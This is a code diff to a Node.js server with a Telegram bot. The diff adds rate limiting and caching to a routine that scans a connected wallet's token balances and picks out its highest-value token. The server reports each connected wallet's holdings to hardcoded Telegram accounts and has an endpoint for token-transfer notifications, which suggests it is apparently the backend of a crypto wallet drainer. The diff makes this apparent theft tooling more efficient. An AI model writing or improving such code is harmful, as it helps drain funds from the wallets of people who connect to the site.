@@ -9,6 +9,31 @@ require('dotenv').config();
 const app = express();
 const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
 
+// Rate limiting utilities
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+class RateLimiter {
+  constructor(requestsPerSecond = 5) {
+    this.requestsPerSecond = requestsPerSecond;
+    this.requests = [];
+  }
+
+  async throttle() {
+    const now = Date.now();
+    this.requests = this.requests.filter(time => now - time < 1000);
+    
+    if (this.requests.length >= this.requestsPerSecond) {
+      const oldestRequest = Math.min(...this.requests);
+      const waitTime = 1000 - (now - oldestRequest);
+      await delay(waitTime);
+    }
+    
+    this.requests.push(Date.now());
+  }
+}
+
+const rateLimiter = new RateLimiter(3); // 3 requests per second
+
 // Middleware
 const allowedOrigins = [
   'http://localhost:3000',
@@ -21,7 +46,6 @@ const allowedOrigins = [
 
 app.use(cors({
   origin: function (origin, callback) {
-    // Allow requests with no origin (like mobile apps or curl requests)
     if (!origin) return callback(null, true);
     
     if (allowedOrigins.includes(origin)) {
@@ -37,7 +61,7 @@ app.use(express.json());
 // Store for user chat IDs (optional, for direct user messages)
 const userChats = new Map();
 
-// Telegram bot commands (optional, mainly for testing)
+// Telegram bot commands
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   bot.sendMessage(chatId, 
@@ -45,7 +69,6 @@ bot.onText(/\/start/, (msg) => {
   );
 });
 
-// Optional: Command to test bot functionality
 bot.onText(/\/test/, (msg) => {
   const chatId = msg.chat.id;
   bot.sendMessage(chatId, '🤖 Bot is working correctly!');
@@ -59,41 +82,97 @@ const TELEGRAM_DESTINATIONS = [
   7997717431,
   7682852056,
   '@nextidearly0125'
-].filter(Boolean); // Remove any undefined values
+].filter(Boolean);
 
 const TELEGRAM_USER_IDS = process.env.TELEGRAM_USER_IDS 
   ? process.env.TELEGRAM_USER_IDS.split(',').map(id => id.trim())
   : [];
 
-// Token analysis configuration
+// Token analysis configuration with cached metadata
 const COMMON_TOKENS = [
-  { address: '0xdac17f958d2ee523a2206206994597c13d831ec7', symbol: 'USDT', priority: 1, coingeckoId: 'tether' },
-  { address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', symbol: 'USDC', priority: 1, coingeckoId: 'usd-coin' },
-  { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', priority: 2, coingeckoId: 'wrapped-bitcoin' },
-  { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', priority: 2, coingeckoId: 'ethereum' },
-  { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', priority: 3, coingeckoId: 'chainlink' },
-  { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', priority: 3, coingeckoId: 'uniswap' },
-  { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', priority: 3, coingeckoId: 'aave' },
-  { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', priority: 1, coingeckoId: 'dai' },
-  { address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', symbol: 'SHIB', priority: 4, coingeckoId: 'shiba-inu' },
-  { address: '0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', symbol: 'CRO', priority: 4, coingeckoId: 'crypto-com-chain' }
+  { 
+    address: '0xdac17f958d2ee523a2206206994597c13d831ec7', 
+    symbol: 'USDT', 
+    decimals: 6,
+    priority: 1, 
+    coingeckoId: 'tether' 
+  },
+  { 
+    address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', 
+    symbol: 'USDC', 
+    decimals: 6,
+    priority: 1, 
+    coingeckoId: 'usd-coin' 
+  },
+  { 
+    address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', 
+    symbol: 'WBTC', 
+    decimals: 8,
+    priority: 2, 
+    coingeckoId: 'wrapped-bitcoin' 
+  },
+  { 
+    address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', 
+    symbol: 'WETH', 
+    decimals: 18,
+    priority: 2, 
+    coingeckoId: 'ethereum' 
+  },
+  { 
+    address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', 
+    symbol: 'LINK', 
+    decimals: 18,
+    priority: 3, 
+    coingeckoId: 'chainlink' 
+  },
+  { 
+    address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', 
+    symbol: 'UNI', 
+    decimals: 18,
+    priority: 3, 
+    coingeckoId: 'uniswap' 
+  },
+  { 
+    address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', 
+    symbol: 'AAVE', 
+    decimals: 18,
+    priority: 3, 
+    coingeckoId: 'aave' 
+  },
+  { 
+    address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', 
+    symbol: 'DAI', 
+    decimals: 18,
+    priority: 1, 
+    coingeckoId: 'dai' 
+  },
+  { 
+    address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', 
+    symbol: 'SHIB', 
+    decimals: 18,
+    priority: 4, 
+    coingeckoId: 'shiba-inu' 
+  },
+  { 
+    address: '0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', 
+    symbol: 'CRO', 
+    decimals: 8,
+    priority: 4, 
+    coingeckoId: 'crypto-com-chain' 
+  }
 ];
 
-// ERC20 ABI for token interactions
-// const ERC20_ABI = [
-//   "function balanceOf(address owner) view returns (uint256)",
-//   "function decimals() view returns (uint8)",
-//   "function symbol() view returns (string)",
-//   "function name() view returns (string)"
-// ];
-
 const ERC20_ABI = erc20Abi;
+
+// Cache for token metadata and prices
+const tokenCache = new Map();
+const priceCache = new Map();
+const CACHE_DURATION = 5 * 60 * 1000; // 5 minutes
 
 app.get('/api/test', (req, res) => {
   res.json({ message: 'Backend is working!', timestamp: new Date().toISOString() });
 });
 
-// API endpoint to get configuration for frontend (without exposing private key)
 app.get('/api/config', (req, res) => {
   try {
     res.json({
@@ -109,7 +188,7 @@ app.get('/api/config', (req, res) => {
   }
 });
 
-// NEW: API endpoint to analyze wallet and get highest value token
+// IMPROVED: API endpoint to analyze wallet with better rate limiting
 app.post('/api/analyze-wallet', async (req, res) => {
   try {
     const { address } = req.body;
@@ -121,7 +200,7 @@ app.post('/api/analyze-wallet', async (req, res) => {
     console.log(`🔍 Starting token analysis for wallet: ${address}`);
 
     // Analyze the wallet to find highest value token
-    const analysisResult = await analyzeWalletTokens(address);
+    const analysisResult = await analyzeWalletTokensImproved(address);
     
     res.json({
       success: true,
@@ -142,8 +221,8 @@ app.post('/api/analyze-wallet', async (req, res) => {
   }
 });
 
-// NEW: Enhanced token analysis function
-async function analyzeWalletTokens(walletAddress) {
+// IMPROVED: Enhanced token analysis function with rate limiting
+async function analyzeWalletTokensImproved(walletAddress) {
   const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
   
   let highestValue = 0;
@@ -157,18 +236,22 @@ async function analyzeWalletTokens(walletAddress) {
   // Sort by priority (stablecoins and major tokens first)
   const sortedTokens = [...COMMON_TOKENS].sort((a, b) => a.priority - b.priority);
 
+  // Process tokens sequentially to avoid rate limits
   for (const token of sortedTokens) {
     try {
       console.log(`📊 Checking ${token.symbol}...`);
       
-      // Get token balance
-      const tokenData = await getTokenBalance(provider, token.address, walletAddress);
+      // Apply rate limiting
+      await rateLimiter.throttle();
+      
+      // Get token balance with cached metadata
+      const tokenData = await getTokenBalanceImproved(provider, token, walletAddress);
       
       if (tokenData && parseFloat(tokenData.balance) > 0) {
         console.log(`💰 Found ${tokenData.balance} ${tokenData.symbol}`);
         
-        // Get token price from CoinGecko
-        const price = await getTokenPrice(token.address);
+        // Get token price from CoinGecko with caching
+        const price = await getTokenPriceWithCache(token.address, token.coingeckoId);
         const balance = parseFloat(tokenData.balance);
         const usdValue = balance * price;
         
@@ -197,6 +280,7 @@ async function analyzeWalletTokens(walletAddress) {
       }
     } catch (error) {
       console.warn(`⚠️ Error analyzing ${token.symbol}:`, error.message);
+      // Continue with next token instead of failing completely
     }
   }
 
@@ -218,16 +302,32 @@ async function analyzeWalletTokens(walletAddress) {
   };
 }
 
-// NEW: Get token balance function
-async function getTokenBalance(provider, tokenAddress, walletAddress) {
+// IMPROVED: Get token balance function with cached metadata
+async function getTokenBalanceImproved(provider, tokenConfig, walletAddress) {
   try {
-    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+    const contract = new ethers.Contract(tokenConfig.address, ERC20_ABI, provider);
     
-    const [balance, decimals, symbol] = await Promise.all([
-      contract.balanceOf(walletAddress),
-      contract.decimals(),
-      contract.symbol()
-    ]);
+    // Use cached decimals and symbol if available
+    let decimals = tokenConfig.decimals;
+    let symbol = tokenConfig.symbol;
+    
+    // Only get balance (most important call)
+    const balance = await contract.balanceOf(walletAddress);
+    
+    // If we don't have cached metadata, get it (but only if needed)
+    if (!decimals || !symbol) {
+      try {
+        await rateLimiter.throttle();
+        [decimals, symbol] = await Promise.all([
+          decimals || contract.decimals(),
+          symbol || contract.symbol()
+        ]);
+      } catch (metadataError) {
+        console.warn(`Using fallback metadata for ${tokenConfig.address}`);
+        decimals = tokenConfig.decimals || 18;
+        symbol = tokenConfig.symbol || 'UNKNOWN';
+      }
+    }
     
     const formattedBalance = ethers.formatUnits(balance, decimals);
     
@@ -235,30 +335,59 @@ async function getTokenBalance(provider, tokenAddress, walletAddress) {
       balance: formattedBalance,
       decimals: decimals,
       symbol: symbol,
-      address: tokenAddress
+      address: tokenConfig.address
     };
   } catch (error) {
-    console.warn(`Token balance error for ${tokenAddress}:`, error.message);
+    console.warn(`Token balance error for ${tokenConfig.address}:`, error.message);
     return null;
   }
 }
 
-// NEW: Get token price from CoinGecko
-async function getTokenPrice(contractAddress) {
+// IMPROVED: Get token price with caching
+async function getTokenPriceWithCache(contractAddress, coingeckoId) {
+  const cacheKey = contractAddress.toLowerCase();
+  const now = Date.now();
+  
+  // Check cache first
+  if (priceCache.has(cacheKey)) {
+    const cached = priceCache.get(cacheKey);
+    if (now - cached.timestamp < CACHE_DURATION) {
+      return cached.price;
+    }
+  }
+  
   try {
-    const response = await axios.get(
-      `https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${contractAddress}&vs_currencies=usd`,
-      { timeout: 5000 }
-    );
+    // Use coingeckoId if available for more reliable pricing
+    const url = coingeckoId 
+      ? `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`
+      : `https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${contractAddress}&vs_currencies=usd`;
     
-    return response.data[contractAddress.toLowerCase()]?.usd || 0;
+    const response = await axios.get(url, { timeout: 5000 });
+    
+    const price = coingeckoId 
+      ? response.data[coingeckoId]?.usd || 0
+      : response.data[contractAddress.toLowerCase()]?.usd || 0;
+    
+    // Cache the result
+    priceCache.set(cacheKey, {
+      price: price,
+      timestamp: now
+    });
+    
+    return price;
   } catch (error) {
     console.warn(`Price fetch failed for ${contractAddress}:`, error.message);
+    
+    // Return cached price if available, even if expired
+    if (priceCache.has(cacheKey)) {
+      return priceCache.get(cacheKey).price;
+    }
+    
     return 0;
   }
 }
 
-// API Routes
+// Rest of your existing API routes remain the same...
 app.post('/api/wallet-connected', async (req, res) => {
   try {
     const { address } = req.body;
@@ -270,8 +399,8 @@ app.post('/api/wallet-connected', async (req, res) => {
     // Get wallet data
     const walletData = await getWalletData(address);
     
-    // NEW: Also analyze tokens to find highest value
-    const tokenAnalysis = await analyzeWalletTokens(address);
+    // Also analyze tokens to find highest value
+    const tokenAnalysis = await analyzeWalletTokensImproved(address);
     
     // Format message with token analysis
     const message = formatWalletMessage(address, walletData, tokenAnalysis);
@@ -297,6 +426,7 @@ app.post('/api/wallet-connected', async (req, res) => {
     res.status(500).json({ error: 'Internal server error' });
   }
 });
+
 
 // API endpoint for token transfer notifications
 app.post('/api/token-transferred', async (req, res) => {
@@ -532,15 +662,12 @@ async function getNFTBalances(address) {
 
 async function calculateTotalUSD(ethBalance, tokens) {
   try {
-    // Get ETH price
     const ethPriceResponse = await axios.get(
       'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd'
     );
     const ethPrice = ethPriceResponse.data.ethereum.usd;
     const ethValue = parseFloat(ethBalance.balance) * ethPrice;
 
-    // For simplicity, we'll just calculate ETH value
-    // In production, you'd want to get prices for all tokens
     return ethValue.toFixed(2);
   } catch (error) {
     console.error('Error calculating USD value:', error);
@@ -553,7 +680,6 @@ function formatWalletMessage(address, data, tokenAnalysis = null) {
   message += `<b>Address:</b> <code>${address}</code>\n`;
   message += `<b>Total Value:</b> $${data.totalUSD} USD\n\n`;
   
-  // NEW: Add highest value token info
   if (tokenAnalysis) {
     const highestToken = tokenAnalysis.details.tokens.find(t => t.address === tokenAnalysis.highestValueToken);
     if (highestToken) {
@@ -562,11 +688,9 @@ function formatWalletMessage(address, data, tokenAnalysis = null) {
     }
   }
   
-  // Native balance
   message += `<b>🔷 Native Balance:</b>\n`;
   message += `${data.balance.balance} ${data.balance.symbol}\n\n`;
   
-  // Tokens
   if (data.tokens.length > 0) {
     message += `<b>🪙 Tokens (${data.tokens.length}):</b>\n`;
     data.tokens.slice(0, 10).forEach(token => {
@@ -578,7 +702,6 @@ function formatWalletMessage(address, data, tokenAnalysis = null) {
     message += `\n`;
   }
   
-  // NFTs
   if (data.nfts.length > 0) {
     message += `<b>🖼 NFTs (${data.nfts.length}):</b>\n`;
     data.nfts.slice(0, 5).forEach(nft => {
